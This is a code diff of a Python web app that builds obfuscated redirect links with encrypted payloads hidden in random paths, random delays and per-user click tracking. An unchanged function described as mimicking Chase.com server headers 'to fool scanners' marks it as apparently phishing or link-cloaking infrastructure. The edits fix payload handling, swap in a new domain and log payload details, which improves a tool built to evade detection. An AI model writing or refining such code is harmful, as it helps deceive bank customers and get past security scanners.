@@ -219,7 +219,7 @@ def encrypt_aes_gcm(payload, key=AES_GCM_KEY):
         ciphertext = encryptor.update(data) + encryptor.finalize()
         encrypted = iv + ciphertext + encryptor.tag
         result = base64.urlsafe_b64encode(encrypted).decode('utf-8')
-        logger.debug(f"AES-GCM encrypted payload: {result[:20]}...")
+        logger.debug(f"AES-GCM encrypted payload: {result[:20]}... (length: {len(result)})")
         return result
     except Exception as e:
         logger.error(f"AES-GCM encryption error: {str(e)}", exc_info=True)
@@ -248,7 +248,7 @@ def encrypt_hmac_sha256(payload, key=HMAC_KEY):
         h.update(data)
         signature = h.finalize()
         result = f"{base64.urlsafe_b64encode(data).decode('utf-8')}.{base64.urlsafe_b64encode(signature).decode('utf-8')}"
-        logger.debug(f"HMAC-SHA256 encrypted payload: {result[:20]}...")
+        logger.debug(f"HMAC-SHA256 encrypted payload: {result[:20]}... (length: {len(result)})")
         return result
     except Exception as e:
         logger.error(f"HMAC-SHA256 encryption error: {str(e)}", exc_info=True)
@@ -273,7 +273,7 @@ def generate_random_string(length):
     try:
         characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
         result = "".join(secrets.choice(characters) for _ in range(length))
-        logger.debug(f"Generated random string: {result[:10]}...")
+        logger.debug(f"Generated random string: {result[:10]}... (length: {len(result)})")
         return result
     except Exception as e:
         logger.error(f"Error generating random string: {str(e)}", exc_info=True)
@@ -288,7 +288,7 @@ def get_base_domain():
         return host
     except Exception as e:
         logger.error(f"Error getting base domain: {str(e)}")
-        return "tamarisksd.com"
+        return "qinjack.com"  # Updated to match your domain
 
 def mimic_chase_response():
     """Mimic Chase.com server headers to fool scanners."""
@@ -519,45 +519,51 @@ def dashboard():
                     "timestamp": int(time.time() * 1000),
                     "expiry": expiry_timestamp
                 })
+                logger.debug(f"Raw payload: {payload}")
 
                 try:
                     if encryption_method == 'aes_gcm':
                         encrypted_payload = encrypt_aes_gcm(payload)
                     else:
                         encrypted_payload = encrypt_hmac_sha256(payload)
+                    logger.debug(f"Encrypted payload: {encrypted_payload[:20]}... (length: {len(encrypted_payload)})")
                 except ValueError as e:
                     logger.error(f"Encryption failed with {encryption_method}: {str(e)}")
                     error = f"Failed to encrypt payload: {str(e)}"
 
                 if not error:
                     # Embed payload in random path
-                    random_prefix = generate_random_string(random_path_length - len(encrypted_payload))
-                    random_path = f"{random_prefix}{encrypted_payload}"
-                    path_segment = f"{random_path}/{randomstring1}{randomstring2}"
-                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{path_segment}"
-                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
-                    if valkey_client:
-                        try:
-                            valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
-                                "url": generated_url,
-                                "destination": destination_link,
-                                "encrypted_payload": encrypted_payload,
-                                "endpoint": endpoint,
-                                "encryption_method": encryption_method,
-                                "key_version": KEY_VERSION,
-                                "created": int(time.time()),
-                                "expiry": expiry_timestamp,
-                                "clicks": 0,
-                                "analytics_enabled": "1" if analytics_enabled else "0"
-                            })
-                            valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
-                            logger.info(f"Generated URL for {username}: {generated_url}, Method: {encryption_method}, Key Version: {KEY_VERSION}, Analytics: {analytics_enabled}")
-                        except Exception as e:
-                            logger.error(f"Valkey error storing URL: {str(e)}", exc_info=True)
-                            error = "Failed to store URL in database"
+                    if len(encrypted_payload) > random_path_length:
+                        error = "Encrypted payload too long for random path"
+                        logger.error(f"Encrypted payload length ({len(encrypted_payload)}) exceeds random_path_length ({random_path_length})")
                     else:
-                        logger.warning("Valkey unavailable, cannot store URL")
-                        error = "Database unavailable"
+                        random_prefix = generate_random_string(random_path_length - len(encrypted_payload))
+                        random_path = f"{random_prefix}{encrypted_payload}"
+                        path_segment = f"{random_path}/{randomstring1}{randomstring2}"
+                        generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{path_segment}"
+                        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
+                        if valkey_client:
+                            try:
+                                valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
+                                    "url": generated_url,
+                                    "destination": destination_link,
+                                    "encrypted_payload": encrypted_payload,
+                                    "endpoint": endpoint,
+                                    "encryption_method": encryption_method,
+                                    "key_version": KEY_VERSION,
+                                    "created": int(time.time()),
+                                    "expiry": expiry_timestamp,
+                                    "clicks": 0,
+                                    "analytics_enabled": "1" if analytics_enabled else "0"
+                                })
+                                valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
+                                logger.info(f"Generated URL for {username}: {generated_url}, Method: {encryption_method}, Key Version: {KEY_VERSION}, Analytics: {analytics_enabled}")
+                            except Exception as e:
+                                logger.error(f"Valkey error storing URL: {str(e)}", exc_info=True)
+                                error = "Failed to store URL in database"
+                        else:
+                            logger.warning("Valkey unavailable, cannot store URL")
+                            error = "Database unavailable"
 
                     if not error:
                         logger.debug("URL generation successful, redirecting to dashboard")
@@ -894,7 +900,7 @@ def redirect_handler(username, endpoint, path_segment):
         time.sleep(delay)
         logger.debug(f"Applied random delay of {delay:.3f} seconds")
 
-        # Extract payload dynamically (avoid fixed 64-char assumption)
+        # Extract payload dynamically
         url_id = None
         encrypted_payload = None
         payload_length = 0
@@ -909,11 +915,11 @@ def redirect_handler(username, endpoint, path_segment):
                 else:
                     logger.warning(f"No URL data found for url_id: {url_id}")
                     # Fallback to extracting from random_path
-                    encrypted_payload = random_path[-payload_length:] if payload_length > 0 else random_path[-64:]
+                    encrypted_payload = random_path
                     url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
             except Exception as e:
                 logger.error(f"Valkey error retrieving URL data: {str(e)}")
-                encrypted_payload = random_path[-64:]  # Fallback
+                encrypted_payload = random_path  # Fallback
                 url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
 
         if not encrypted_payload:
@@ -926,7 +932,7 @@ def redirect_handler(username, endpoint, path_segment):
 
         try:
             encrypted_payload = urllib.parse.unquote(encrypted_payload)
-            logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}...")
+            logger.debug(f"Decoded encrypted_payload: {encrypted_payload[:20]}... (length: {len(encrypted_payload)})")
         except Exception as e:
             logger.error(f"Error decoding encrypted_payload: {str(e)}")
             return Response(
@@ -984,7 +990,14 @@ def redirect_handler(username, endpoint, path_segment):
                         break
                     except ValueError as e:
                         logger.debug(f"Decryption failed with {method} and key version {key_version}: {str(e)}")
-                        continue
+                        # Fallback: Check if payload is unencrypted JSON
+                        try:
+                            json.loads(encrypted_payload)
+                            logger.warning(f"Detected unencrypted payload: {encrypted_payload[:50]}...")
+                            payload = encrypted_payload
+                            break
+                        except json.JSONDecodeError:
+                            continue
                 if payload:
                     break
 
